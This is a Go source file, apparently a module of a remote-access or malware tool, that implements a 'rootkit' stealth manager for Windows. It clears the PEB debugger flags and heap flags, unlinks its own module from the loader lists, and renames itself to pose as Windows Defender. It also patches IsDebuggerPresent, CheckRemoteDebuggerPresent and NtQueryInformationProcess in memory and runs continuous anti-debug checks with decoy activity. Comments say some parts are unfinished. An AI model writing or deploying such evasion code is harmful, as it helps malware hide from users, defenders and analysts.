package handlers

import (
	"fmt"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// is test, antidebug no rlly implemented
type StealthManager struct {
	mu              sync.RWMutex
	hidden          bool
	originalEntries []*listEntry
	hooks           map[string]uintptr
	antiDebugActive bool
	processName     string
	lastCheck       time.Time
	checkInterval   time.Duration
}

type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type peb struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte 
	BitField                 byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	SubSystemData            uintptr
	ProcessHeap              uintptr
	FastPebLock              uintptr
	AtlThunkSListPtr         uintptr
	IFEOKey                  uintptr
	CrossProcessFlags        uint32
	_                        [4]byte 
	KernelCallbackTable      uintptr
	SystemReserved           uint32
	AtlThunkSListPtr32       uint32
	ApiSetMap                uintptr
}

type pebLdrData struct {
	Length                          uint32
	Initialized                     byte
	SsHandle                        uintptr
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
	EntryInProgress                 uintptr
	ShutdownInProgress              byte
	ShutdownThreadId                uintptr
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

type ldrDataTableEntry struct {
	InLoadOrderLinks           listEntry
	InMemoryOrderLinks         listEntry
	InInitializationOrderLinks listEntry
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	FullDllName                unicodeString
	BaseDllName                unicodeString
	Flags                      uint32
	LoadCount                  uint16
	TlsIndex                   uint16
	HashLinks                  listEntry
	TimeDateStamp              uint32
}

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

var (
	stealthNtdllCache    *windows.LazyDLL
	stealthKernel32Cache *windows.LazyDLL
	stealthOnce          sync.Once
)

func NewStealthManager() *StealthManager {
	return &StealthManager{
		hooks:         make(map[string]uintptr),
		checkInterval: 100 * time.Millisecond,
		processName:   "WinDefenderUpdate.exe", // probably cause some issues
	}
}

func initStealthDLLs() {
	stealthNtdllCache = windows.NewLazySystemDLL("ntdll.dll")
	stealthKernel32Cache = windows.NewLazySystemDLL("kernel32.dll")
}

func (sm *StealthManager) ActivateRootkit() string {
	return sm.ActivateAdvancedRootkit()
}

func (sm *StealthManager) ActivateAdvancedRootkit() string {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.hidden {
		return "🔒 Already hidden"
	}

	stealthOnce.Do(initStealthDLLs)

	if err := sm.activateAntiDebug(); err != nil {
		return fmt.Sprintf("❌ Anti-debug failed: %v", err)
	}

	if err := sm.hideFromPEBAdvanced(); err != nil {
		return fmt.Sprintf("❌ PEB hiding failed: %v", err)
	}

	if err := sm.hookCriticalAPIs(); err != nil {
		return fmt.Sprintf("❌ API hooking failed: %v", err)
	}

	if err := sm.spoofProcessName(); err != nil {
		return fmt.Sprintf("❌ Process spoofing failed: %v", err)
	}

	go sm.continuousAntiDebug()

	sm.hidden = true
	sm.antiDebugActive = true

	return "🔒 stealth mode activated"
}

func (sm *StealthManager) activateAntiDebug() error {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, err := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: %v", err)
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))

	pebPtr.BeingDebugged = 0

	ntGlobalFlagPtr := (*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(pebPtr)) + 0x68))
	*ntGlobalFlagPtr = 0

	if pebPtr.ProcessHeap != 0 {
		heapPtr := unsafe.Pointer(pebPtr.ProcessHeap)
		flagsPtr := (*uint32)(unsafe.Pointer(uintptr(heapPtr) + 0x40))      // Heap Flags
		forceFlagsPtr := (*uint32)(unsafe.Pointer(uintptr(heapPtr) + 0x44)) // Force Flags

		*flagsPtr = 0x02   // HEAP_GROWABLE
		*forceFlagsPtr = 0 // clean force flags
	}

	return nil
}

func (sm *StealthManager) hideFromPEBAdvanced() error {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, err := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: %v", err)
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	ldr := (*pebLdrData)(unsafe.Pointer(pebPtr.Ldr))

	currentModule := sm.findCurrentModule(&ldr.InLoadOrderModuleList)
	if currentModule != nil {
		sm.originalEntries = append(sm.originalEntries,
			&currentModule.InLoadOrderLinks,
			&currentModule.InMemoryOrderLinks,
			&currentModule.InInitializationOrderLinks,
		)

		sm.unlinkEntryAdvanced(&currentModule.InLoadOrderLinks)
		sm.unlinkEntryAdvanced(&currentModule.InMemoryOrderLinks)
		sm.unlinkEntryAdvanced(&currentModule.InInitializationOrderLinks)

		if currentModule.BaseDllName.Buffer != nil {
			sm.spoofModuleName(&currentModule.BaseDllName)
		}
	}

	return nil
}

func (sm *StealthManager) findCurrentModule(head *listEntry) *ldrDataTableEntry {
	imageBase := sm.getImageBase()

	for entry := head.Flink; entry != head && entry != nil; entry = entry.Flink {
		module := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) -
			unsafe.Offsetof(ldrDataTableEntry{}.InLoadOrderLinks)))

		if module.DllBase == imageBase {
			return module
		}
	}
	return nil
}

func (sm *StealthManager) getImageBase() uintptr {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	return pebPtr.ImageBaseAddress
}

func (sm *StealthManager) unlinkEntryAdvanced(le *listEntry) {
	if le == nil || le.Flink == nil || le.Blink == nil {
		return
	}

	if sm.isValidPointer(unsafe.Pointer(le.Flink)) &&
		sm.isValidPointer(unsafe.Pointer(le.Blink)) {
		le.Flink.Blink = le.Blink
		le.Blink.Flink = le.Flink

		le.Flink = nil
		le.Blink = nil
	}
}

func (sm *StealthManager) isValidPointer(ptr unsafe.Pointer) bool {
	if ptr == nil {
		return false
	}

	address := uintptr(ptr)
	return address > 0x10000 && address < 0x7FFFFFFF0000 // x64
}

func (sm *StealthManager) spoofProcessName() error {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, _ := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return fmt.Errorf("failed to get PEB")
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))

	if pebPtr.ProcessParameters != 0 {
		sm.cleanProcessReferences(pebPtr)
	}

	return nil
}

func (sm *StealthManager) cleanProcessReferences(peb *peb) {
	runtime.GC() 
}

func (sm *StealthManager) spoofModuleName(name *unicodeString) {
	if name.Buffer == nil {
		return
	}

	stealthName := []uint16{'W', 'i', 'n', 'D', 'e', 'f', 'e', 'n', 'd', 'e', 'r', '.', 'e', 'x', 'e', 0}

	maxLen := int(name.MaximumLength / 2) // UTF-16 = 2 bytes por char
	copyLen := len(stealthName)
	if copyLen > maxLen {
		copyLen = maxLen
	}

	for i := 0; i < copyLen && i < len(stealthName); i++ {
		*(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(name.Buffer)) +
			uintptr(i*2))) = stealthName[i]
	}

	name.Length = uint16(copyLen * 2)
}

func (sm *StealthManager) hookCriticalAPIs() error {
	criticalAPIs := map[string]map[string]bool{
		"ntdll.dll":    {"NtQueryInformationProcess": true},
		"kernel32.dll": {"IsDebuggerPresent": true, "CheckRemoteDebuggerPresent": true},
	}

	for dllName, apis := range criticalAPIs {
		for apiName := range apis {
			if err := sm.hookAPI(dllName, apiName); err != nil {
				continue
			}
		}
	}

	return nil
}

func (sm *StealthManager) hookAPI(dllName, apiName string) error {
	var dll *windows.LazyDLL
	if dllName == "ntdll.dll" {
		dll = stealthNtdllCache
	} else {
		dll = stealthKernel32Cache
	}

	proc := dll.NewProc(apiName)

	addr := proc.Addr()
	if addr == 0 {
		return fmt.Errorf("API %s not found", apiName)
	}

	hookCode := []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3} // mov eax, 0; ret

	var oldProtect uint32
	procVirtualProtect := stealthKernel32Cache.NewProc("VirtualProtect")

	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(hookCode)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed")
	}

	for i, b := range hookCode {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	procVirtualProtect.Call(
		addr,
		uintptr(len(hookCode)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	sm.hooks[dllName+":"+apiName] = addr
	return nil
}

// antidebug monitoring
func (sm *StealthManager) continuousAntiDebug() {
	ticker := time.NewTicker(sm.checkInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if !sm.antiDebugActive {
				return
			}

			sm.mu.RLock()
			if time.Since(sm.lastCheck) > sm.checkInterval {
				sm.performAntiDebugCheck()
				sm.lastCheck = time.Now()
			}
			sm.mu.RUnlock()
		}
	}
}

// Check anti-debug periódico
func (sm *StealthManager) performAntiDebugCheck() {
	// 1 Check IsDebuggerPresent
	procIsDebugger := stealthKernel32Cache.NewProc("IsDebuggerPresent")
	ret, _, _ := procIsDebugger.Call()
	if ret != 0 {
		sm.activateCountermeasures()
		return
	}

	// 2 check timing attacks
	start := time.Now()
	runtime.Gosched() 
	if time.Since(start) > 10*time.Millisecond {
		sm.activateCountermeasures()
	}
}

// antidebug test
func (sm *StealthManager) activateCountermeasures() {
	// os.Exit(0)
	go sm.runDecoyBehavior()

}

// for analisis
func (sm *StealthManager) runDecoyBehavior() {
	for i := 0; i < 100; i++ {
		time.Sleep(50 * time.Millisecond)
		_ = fmt.Sprintf("Windows Update Check %d", i)
	}
}

// debug
func (sm *StealthManager) RestoreOriginalState() {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	sm.antiDebugActive = false

	for _, entry := range sm.originalEntries {
		_ = entry
	}

	sm.hidden = false
}

// rootkit status
func (sm *StealthManager) GetStealthStatus() string {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	status := fmt.Sprintf("🔒 Stealth Status:\n")
	status += fmt.Sprintf("Hidden: %t\n", sm.hidden)
	status += fmt.Sprintf("Anti-Debug: %t\n", sm.antiDebugActive)
	status += fmt.Sprintf("Hooks: %d active\n", len(sm.hooks))
	status += fmt.Sprintf("Process: %s\n", sm.processName)

	return status
}
